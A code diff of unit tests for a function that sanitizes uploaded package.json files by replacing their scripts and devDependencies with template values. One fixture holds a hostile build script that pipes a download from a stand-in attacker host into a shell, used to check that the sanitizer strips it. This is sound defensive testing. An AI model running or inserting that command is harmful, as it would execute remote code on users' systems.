@@ -492,32 +492,67 @@ describe('validateDataAppDependencies', () => {
 
 describe('sanitizeAppPackageJsonScripts', () => {
     const templateScripts = { dev: 'vite', build: 'vite build' };
+    const templateDevDependencies = { vite: '8.0.16' };
 
     it('replaces uploader scripts with the template scripts', () => {
         const input = JSON.stringify({
             name: 'app',
+            version: '1.0.0',
             scripts: { build: 'curl https://evil.example.com | sh' },
             dependencies: { react: '19.2.5' },
+            packageManager: 'npm@1.0.0',
         });
         const parsed = JSON.parse(
-            sanitizeAppPackageJsonScripts(input, templateScripts),
+            sanitizeAppPackageJsonScripts(
+                input,
+                templateScripts,
+                templateDevDependencies,
+            ),
         );
-        expect(parsed.scripts).toEqual(templateScripts);
-        expect(parsed.dependencies).toEqual({ react: '19.2.5' });
+        expect(parsed).toEqual({
+            name: 'app',
+            version: '1.0.0',
+            dependencies: { react: '19.2.5' },
+            devDependencies: templateDevDependencies,
+            scripts: templateScripts,
+        });
     });
 
     it('adds template scripts when the upload has none', () => {
         const input = JSON.stringify({ dependencies: {} });
         const parsed = JSON.parse(
-            sanitizeAppPackageJsonScripts(input, templateScripts),
+            sanitizeAppPackageJsonScripts(
+                input,
+                templateScripts,
+                templateDevDependencies,
+            ),
         );
         expect(parsed.scripts).toEqual(templateScripts);
     });
 
-    it('returns the input unchanged when it is not valid JSON', () => {
-        expect(sanitizeAppPackageJsonScripts('not-json', templateScripts)).toBe(
-            'not-json',
+    it('replaces uploader-controlled devDependencies with the template set', () => {
+        const input = JSON.stringify({
+            dependencies: { react: '19.2.5' },
+            devDependencies: { vite: '1.0.0' },
+        });
+        const parsed = JSON.parse(
+            sanitizeAppPackageJsonScripts(
+                input,
+                templateScripts,
+                templateDevDependencies,
+            ),
         );
+        expect(parsed.devDependencies).toEqual(templateDevDependencies);
+    });
+
+    it('returns the input unchanged when it is not valid JSON', () => {
+        expect(
+            sanitizeAppPackageJsonScripts(
+                'not-json',
+                templateScripts,
+                templateDevDependencies,
+            ),
+        ).toBe('not-json');
     });
 });
 
